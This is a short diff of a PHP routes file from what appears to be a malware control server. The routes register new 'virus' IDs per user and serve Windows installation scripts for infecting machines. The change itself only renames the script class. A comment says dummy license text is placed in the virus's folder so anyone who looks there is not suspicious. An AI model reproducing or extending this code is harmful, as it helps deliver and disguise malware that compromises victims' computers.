@@ -1,7 +1,7 @@
 <?php
 
 // routes for installation entry point
-use Kelvinho\Virus\Attack\BaseScriptWin;
+use Kelvinho\Virus\Attack\BaseScript\Windows;
 use Kelvinho\Virus\Singleton\Header;
 
 $router->get("new/*", function () use ($requestData, $userFactory, $virusFactory) {
@@ -9,7 +9,7 @@ $router->get("new/*", function () use ($requestData, $userFactory, $virusFactory
     if (!$userFactory->exists($user_handle)) Header::notFound();
     if ($userFactory->get($user_handle)->isHold()) Header::notFound();
     $virus = $virusFactory->new($user_handle);
-    echo BaseScriptWin::initStandalone($virus->getVirusId(), $user_handle);
+    echo Windows::initStandalone($virus->getVirusId(), $user_handle);
     Header::ok();
 });
 $router->get("new/win/*/entry/*", function () use ($requestData, $userFactory) {
@@ -17,7 +17,7 @@ $router->get("new/win/*/entry/*", function () use ($requestData, $userFactory) {
     if (!$userFactory->exists($user_handle)) Header::notFound();
     if ($userFactory->get($user_handle)->isHold()) Header::notFound();
     $virus_id = $requestData->getExplodedPath()[4];
-    echo BaseScriptWin::simpleMain($virus_id);
+    echo Windows::simpleMain($virus_id);
     Header::ok();
 });
 //Dummy license text, to make anyone wanders into the virus's folder not suspicious of anything. TL;DR: make it looks legit
